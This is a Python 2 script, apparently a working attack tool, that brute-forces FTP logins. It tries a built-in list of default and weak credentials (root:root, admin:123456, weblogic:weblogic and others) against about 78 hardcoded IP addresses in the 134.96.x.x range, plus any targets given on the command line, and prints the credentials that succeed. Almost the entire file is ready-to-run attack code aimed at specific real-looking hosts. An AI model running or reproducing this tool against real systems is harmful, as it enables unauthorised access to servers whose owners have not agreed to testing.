# -*- coding: UTF-8 -*-
__author__ = 'orleven'

'''
    Ftp 匿名、弱口令爆破
'''

import socket
import ftplib
import optparse
import threading

targetList = [
"134.96.247.76",
"134.96.247.77",
"134.96.247.78",
"134.96.247.79",
"134.96.247.80",
"134.96.247.81",
"134.96.247.82",
"134.96.247.83",
"134.96.247.84",
"134.96.247.85",
"134.96.247.86",
"134.96.247.87",
"134.96.247.88",
"134.96.247.89",
"134.96.247.90",
"134.96.247.91",
"134.96.247.100",
"134.96.247.101",
"134.96.247.102",
"134.96.247.103",
"134.96.247.104",
"134.96.247.105",
"134.96.247.106",
"134.96.247.107",
"134.96.246.108",
"134.96.246.105",
"134.96.246.106",
"134.96.246.107",
"134.96.247.110",
"134.96.247.111",
"134.96.171.210",
"134.96.171.211",
"134.96.244.159",
"134.96.244.160",
"134.96.244.161",
"134.96.244.162",
"134.96.234.6",
"134.96.234.7",
"134.96.234.8",
"134.96.234.9",
"134.96.249.22",
"134.96.171.236",
"134.96.171.237",
"134.96.246.19",
"134.96.246.20",
"134.96.245.4",
"134.96.245.5",
"134.96.245.6",
"134.96.245.7",
"134.96.245.8",
"134.96.245.9",
"134.96.245.10",
"134.96.245.11",
"134.96.245.101",
"134.96.245.102",
"134.96.245.103",
"134.96.245.104",
"134.96.245.105",
"134.96.245.106",
"134.96.245.107",
"134.96.245.108",
"134.96.245.109",
"134.96.245.110",
"134.96.245.111",
"134.96.245.112",
"134.96.245.113",
"134.96.245.114",
"134.96.245.115",
"134.96.245.116",
"134.96.142.135",
"134.96.142.136",
"134.96.142.137",
"134.96.142.138",
"134.96.142.139",
"134.96.142.140",
"134.96.142.141",
"134.96.142.142",
"134.96.249.51",



]
userpwdList = [
    "admin:123456",
    "admin:1234567890",
    "admin:1qaz2wsx",
    "admin:2wsx3edc",
    "admin:admin",
    "admin:admin123456",
    "administrator:123456",
    "administrator:1234567890",
    "administrator:admin",
    "administrator:admin123456",
    "oracle:oracle",
    "oracle:oracle123",
    "root:123456",
    "root:1qaz2wsx",
    "root:2wsx3edc",
    "root:admin",
    "root:root",
    "root:root123456",
    "root:toor",
    "weblogic:weblogic",
    "weblogic:weblogic123",
    "weblogic:weblogic123!",
    "weblogic_123:weblogic_123",
    "spark:spark",
    "spark:admin",
    "anonymous:test@orleven.com",
]
threadList = []
threadNum = 10
timeout=3

def _bruteLogin(hostname):
    flag = False
    print "[.] Trying: " + hostname +"\r\n",
    for line in userpwdList:
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print '[+] ' + str(hostname) + ': FTP Logon Succeeded: ' + username  + ":" + password  +"\r\n",
            flag = True
            ftp.quit()
        except Exception, e:
            pass
    if not flag :
        print '[-] Could not brute force FTP credentials for '+ hostname +"\r\n",
    return (None, None)

def bruteLogin(threadId):
    for i in xrange(threadId,len(targetList),threadNum):
        dic = _bruteLogin(targetList[i])
        
def scan():
    print "[.] Run start: Total " + str(len(targetList)) + " hosts!"+ "\r\n",
    socket.setdefaulttimeout(timeout)
    for threadId in xrange(0,threadNum):
        t = threading.Thread(target=bruteLogin,args=(threadId,))
        t.start()
        threadList.append(t)
    for num in xrange(0,threadNum):
        threadList[num].join()
    print "\r\n[.] Run over!"+ "\r\n",

def main():
    parse = optparse.OptionParser("usage %prog -T/t <target host> -P <target password>")
    parse.add_option('-t', dest='tgtHost', type='string', help='specify target host')
    parse.add_option('-T', dest='tgtHostFile', type='string', help='specify target host file')
    parse.add_option('-P', dest='tgtPasswordFile', type='string', help='specify target password file')
    (options, args) = parse.parse_args()
    if options.tgtHost != None :
        host = options.tgtHost
        targetList.append(host);
    if options.tgtPasswordFile != None:
        filepath = options.tgtPasswordFile
        if os.path.isfile(filepath):
            with open(filepath, 'r') as f:
                for line in f.readlines():
                    myline = line.strip('\r').strip('\n')
                    userpwdList.append(myline)
        else:
            print "[-] The path is not exist!" +"\r\n",
    if options.tgtHostFile != None :
        with open(options.tgtHostFile, 'r') as f:
            for line in f.readlines():
                host = line.strip('\r').strip('\n')
                targetList.append(host);
    scan()


if __name__ == '__main__':
    main()
